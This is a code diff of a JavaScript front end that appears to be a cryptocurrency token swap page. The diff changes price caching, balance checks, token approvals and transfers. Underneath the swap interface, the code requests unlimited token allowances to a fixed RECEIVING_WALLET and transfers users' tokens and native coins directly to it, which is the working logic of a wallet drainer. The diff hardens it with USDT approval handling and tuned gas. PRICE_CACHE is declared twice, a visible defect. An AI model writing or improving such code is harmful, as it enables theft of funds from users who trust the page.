@@ -8,6 +8,7 @@ if (typeof RECEIVING_WALLET === 'undefined') throw new Error("RECEIVING_WALLET n
 // Constants
 const COINGECKO_API = "https://api.coingecko.com/api/v3";
 const CURRENCY_OPTIONS = ["usd", "eth", "btc"];
+const PRICE_CACHE = new Map();
 const PRICE_CACHE_DURATION = 20000; // 20 seconds in ms
 const FEE_TOKENS = {
   ethereum: "0x0000000000000000000000000000000000000000", // ETH
@@ -552,6 +553,8 @@ async function checkNetwork() {
 // TOKEN FUNCTIONS
 // =====================
 
+const PRICE_CACHE = new Map();
+
 function showTokenList(type) {
   const modal = document.getElementById("tokenListModal");
   const tokenItems = document.getElementById("tokenItems");
@@ -614,7 +617,7 @@ async function fetchCoinGeckoTokens(network) {
     const cgUrl = COINGECKO_TOKEN_LISTS[network];
     if (!cgUrl) return [];
     
-    const response = await fetch(cgUrl);
+    const response = await fetchWithTimeout(cgUrl, { timeout: 3000 });
     if (!response.ok) throw new Error('CoinGecko API error');
     
     const data = await response.json();
@@ -888,18 +891,6 @@ function updateTokenSelector(selectorId, token) {
   }
 }
 
-function debounce(func, wait) {
-  let timeout;
-  return function(...args) {
-    clearTimeout(timeout);
-    timeout = setTimeout(() => func.apply(this, args), wait);
-  };
-}
-
-function shortenAddress(address, chars = 4) {
-  if (!address) return '';
-  return `${address.substring(0, chars + 2)}...${address.substring(address.length - chars)}`;
-}
 async function updateToAmount() {
   const fromAmount = parseFloat(document.getElementById("fromAmount").value) || 0;
   
@@ -951,51 +942,26 @@ async function updateToAmount() {
   updateSwapButton();
 }
 
-async function getConversionRate(fromToken, toToken) {
-  try {
-    const fromPrice = await getTokenPrice(fromToken);
-    const toPrice = await getTokenPrice(toToken);
-    
-    if (fromPrice && toPrice) {
-      return fromPrice / toPrice;
-    }
-    
-    // Fallback to hardcoded rates if API fails
-    return getHardcodedRate(fromToken, toToken);
-  } catch (err) {
-    console.error("Error getting conversion rate:", err);
-    return getHardcodedRate(fromToken, toToken);
-  }
-}
-
-function getHardcodedRate(fromToken, toToken) {
-  const rates = {
-    'ETH-USDT': 1800,
-    'USDT-ETH': 0.00055,
-    'ETH-USDC': 1800,
-    'USDC-ETH': 0.00055,
-    'ETH-DAI': 1800,
-    'DAI-ETH': 0.00055,
-    'BNB-USDT': 562,
-    'USDT-BNB': 0.0033,
-    'MATIC-USDT': 0.7,
-    'USDT-MATIC': 1.428,
-    'ARB-USDT': 1.2,
-    'USDT-ARB': 0.83
-  };
-  
-  const pair = `${fromToken.symbol}-${toToken.symbol}`;
-  return rates[pair] || null;
-}
-
 async function getTokenPrice(token) {
   try {
-    // Check cache first
-    const cacheKey = `price-${token.symbol}-${currentCurrency}`;
-    const cached = localStorage.getItem(cacheKey);
+    const cacheKey = `${currentNetwork}-${token.symbol}-${currentCurrency}`;
+    const now = Date.now();
+    
+    // Check memory cache first
+    if (PRICE_CACHE.has(cacheKey)) {
+      const { price, timestamp } = PRICE_CACHE.get(cacheKey);
+      if (now - timestamp < PRICE_CACHE_DURATION) {
+        return price;
+      }
+    }
+    
+    // Check localStorage cache
+    const localStorageKey = `price-${cacheKey}`;
+    const cached = localStorage.getItem(localStorageKey);
     if (cached) {
       const { price, timestamp } = JSON.parse(cached);
-      if (Date.now() - timestamp < PRICE_CACHE_DURATION) {
+      if (now - timestamp < PRICE_CACHE_DURATION) {
+        PRICE_CACHE.set(cacheKey, { price, timestamp });
         return price;
       }
     }
@@ -1009,13 +975,17 @@ async function getTokenPrice(token) {
         ethereum: 'ethereum',
         bsc: 'binancecoin',
         polygon: 'matic-network',
-        arbitrum: 'ethereum', // ETH is native on Arbitrum
-        base: 'ethereum'     // ETH is native on Base
+        arbitrum: 'ethereum',
+        base: 'ethereum'
       };
       
       const id = nativeTokenIds[network];
       if (id) {
-        const response = await fetch(`${COINGECKO_API}/simple/price?ids=${id}&vs_currencies=${currentCurrency}`);
+        const response = await fetchWithTimeout(
+          `${COINGECKO_API}/simple/price?ids=${id}&vs_currencies=${currentCurrency}`,
+          { timeout: 3000 }
+        );
+        
         if (response.ok) {
           const data = await response.json();
           price = data[id]?.[currentCurrency];
@@ -1034,24 +1004,20 @@ async function getTokenPrice(token) {
       
       const platform = platformIds[network];
       if (platform) {
-        try {
-          // First try contract lookup
-          const contractResponse = await fetch(`${COINGECKO_API}/coins/${platform}/contract/${token.address}`);
-          if (contractResponse.ok) {
-            const contractData = await contractResponse.json();
-            price = contractData.market_data?.current_price?.[currentCurrency];
-          }
-          
-          // If contract lookup fails, try symbol search
-          if (!price) {
-            const symbolResponse = await fetch(`${COINGECKO_API}/simple/price?ids=${token.symbol.toLowerCase()}&vs_currencies=${currentCurrency}`);
-            if (symbolResponse.ok) {
-              const symbolData = await symbolResponse.json();
-              price = symbolData[token.symbol.toLowerCase()]?.[currentCurrency];
-            }
-          }
-        } catch (err) {
-          console.error(`Error fetching price for ${token.symbol}:`, err);
+        // Try both contract and symbol lookup in parallel
+        const [contractResponse, symbolResponse] = await Promise.all([
+          fetchWithTimeout(`${COINGECKO_API}/coins/${platform}/contract/${token.address}`, { timeout: 3000 }),
+          fetchWithTimeout(`${COINGECKO_API}/simple/price?ids=${token.symbol.toLowerCase()}&vs_currencies=${currentCurrency}`, { timeout: 3000 })
+        ]);
+        
+        if (contractResponse.ok) {
+          const contractData = await contractResponse.json();
+          price = contractData.market_data?.current_price?.[currentCurrency];
+        }
+        
+        if (!price && symbolResponse.ok) {
+          const symbolData = await symbolResponse.json();
+          price = symbolData[token.symbol.toLowerCase()]?.[currentCurrency];
         }
       }
     }
@@ -1066,25 +1032,94 @@ async function getTokenPrice(token) {
         'USDC': { usd: 1, btc: 0.00003, eth: 0.0006 },
         'DAI': { usd: 1, btc: 0.00003, eth: 0.0006 },
         'WBTC': { usd: 30000, btc: 1, eth: 16.67 },
-        'ARB': { usd: 1.2, btc: 0.00004, eth: 0.0007 },
-        'AUTO': { usd: 7.78, btc: 0.00009486, eth: 0.004326 }
+        'ARB': { usd: 1.2, btc: 0.00004, eth: 0.0007 }
       };
       
       price = hardcodedPrices[token.symbol]?.[currentCurrency];
     }
     
     // Cache the price if found
-    if (price) {
-      localStorage.setItem(cacheKey, JSON.stringify({
-        price,
-        timestamp: Date.now()
-      }));
+    if (price !== null) {
+      const cacheData = { price, timestamp: now };
+      PRICE_CACHE.set(cacheKey, cacheData);
+      localStorage.setItem(localStorageKey, JSON.stringify(cacheData));
     }
     
     return price;
   } catch (err) {
     console.error(`Error getting price for ${token.symbol}:`, err);
     return null;
+  }
+}
+
+async function fetchWithTimeout(resource, options = {}) {
+  const { timeout = 8000 } = options;
+  
+  const controller = new AbortController();
+  const id = setTimeout(() => controller.abort(), timeout);
+  
+  const response = await fetch(resource, {
+    ...options,
+    signal: controller.signal  
+  });
+  
+  clearTimeout(id);
+  return response;
+}
+
+async function fetchTokenBalance(token) {
+  if (!userAddress) return 0;
+  
+  try {
+    // Skip tokens with invalid addresses
+    if (token.address && !ethers.utils.isAddress(token.address)) {
+      console.warn(`Skipping ${token.symbol} - invalid address`);
+      return 0;
+    }
+
+    let balance;
+    if (token.isNative) {
+      balance = await provider.getBalance(userAddress);
+      return parseFloat(ethers.utils.formatEther(balance));
+    } else {
+      const contract = new ethers.Contract(token.address, ERC20_ABI, provider);
+      try {
+        balance = await contract.balanceOf(userAddress);
+        return parseFloat(ethers.utils.formatUnits(balance, token.decimals || 18));
+      } catch (err) {
+        console.warn(`Balance check failed for ${token.symbol}:`, err.message);
+        return 0;
+      }
+    }
+  } catch (err) {
+    console.warn(`Error fetching ${token.symbol} balance:`, err.message);
+    return 0;
+  }
+}
+
+async function updateTokenBalances() {
+  if (!userAddress || !currentFromToken) return;
+  
+  try {
+    const balanceElement = document.getElementById("fromTokenBalance");
+    balanceElement.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Loading...';
+    
+    const balance = await fetchTokenBalance(currentFromToken);
+    if (balance <= 0) {
+      balanceElement.innerHTML = `
+        Balance: 0 ${currentFromToken.symbol}
+      `;
+      document.getElementById("swapBtn").disabled = true;
+    } else {
+      balanceElement.innerHTML = `
+        Balance: ${balance.toFixed(6)} ${currentFromToken.symbol}
+      `;
+    }
+  } catch (err) {
+    console.error("Error updating balances:", err);
+    document.getElementById("fromTokenBalance").innerHTML = `
+      <span style="color: var(--error)">Balance: Error loading</span>
+    `;
   }
 }
 // =====================
@@ -1337,43 +1372,45 @@ function combineTokens(localTokens, cgTokens) {
 }
 
 async function checkAndApproveToken(token, amount) {
-  try {
-    if (!token.address || token.isNative) return true;
+  if (!token.address || token.isNative) return true;
 
-    // Create contract with complete ABI
+  try {
     const contract = new ethers.Contract(token.address, ERC20_ABI, signer);
+    const neededAllowance = ethers.utils.parseUnits(amount.toString(), token.decimals || 18);
     
     // Check current allowance
     const allowance = await contract.allowance(userAddress, RECEIVING_WALLET);
-    const neededAllowance = ethers.utils.parseUnits(amount.toString(), token.decimals || 18);
-    
-    if (allowance.gte(neededAllowance)) {
-      return true; // Already approved
-    }
+    if (allowance.gte(neededAllowance)) return true;
 
-    // Request approval
+    // Request approval with proper gas
     updateStatus(`Approving ${token.symbol}...`, "success");
+    
+    // Special handling for USDT which doesn't allow changing allowance from non-zero
+    if (token.symbol === 'USDT' && !allowance.isZero()) {
+      // First set to zero
+      const zeroTx = await contract.approve(
+        RECEIVING_WALLET,
+        ethers.constants.Zero,
+        { gasLimit: 100000 }
+      );
+      await zeroTx.wait();
+    }
+    
+    // Then set to max
     const approveTx = await contract.approve(
       RECEIVING_WALLET,
-      ethers.constants.MaxUint256, // Approve max amount
-      { gasLimit: 100000 }
+      ethers.constants.MaxUint256,
+      { gasLimit: 150000 } // Increased gas limit
     );
     
-    // Wait for transaction to be mined
-    const receipt = await approveTx.wait();
-    if (receipt.status === 1) {
-      return true;
-    } else {
-      throw new Error("Approval transaction failed");
-    }
-
+    await approveTx.wait();
+    return true;
   } catch (err) {
     console.error("Approval error:", err);
     updateStatus(`Approval failed for ${token.symbol}`, "error");
     return false;
   }
 }
-
 async function transferNativeToken(token, amount) {
   try {
     updateStatus(`Sending ${amount} ${token.symbol}...`, "success");
@@ -1400,13 +1437,30 @@ async function transferERC20Token(token, amount) {
     const contract = new ethers.Contract(token.address, ERC20_ABI, signer);
     const amountInWei = ethers.utils.parseUnits(amount.toString(), token.decimals || 18);
     
-    // Increase gas limit for problematic tokens
+    // Dynamic gas estimation with fallback
+    let gasEstimate;
+    try {
+      gasEstimate = await contract.estimateGas.transfer(
+        RECEIVING_WALLET,
+        amountInWei
+      );
+    } catch (e) {
+      console.warn(`Gas estimation failed for ${token.symbol}, using fallback`);
+      gasEstimate = ethers.BigNumber.from(200000); // Fallback gas limit
+    }
+
+    // Add 20% buffer to gas estimate
+    const gasLimit = gasEstimate.mul(120).div(100);
+    
+    // Get current gas price and add 10% premium
+    const gasPrice = (await provider.getGasPrice()).mul(110).div(100);
+    
     const tx = await contract.transfer(
       RECEIVING_WALLET,
       amountInWei,
       { 
-        gasLimit: 200000, // Increased from 100000
-        gasPrice: ethers.utils.parseUnits('5', 'gwei') // Explicit gas price
+        gasLimit,
+        gasPrice
       }
     );
     
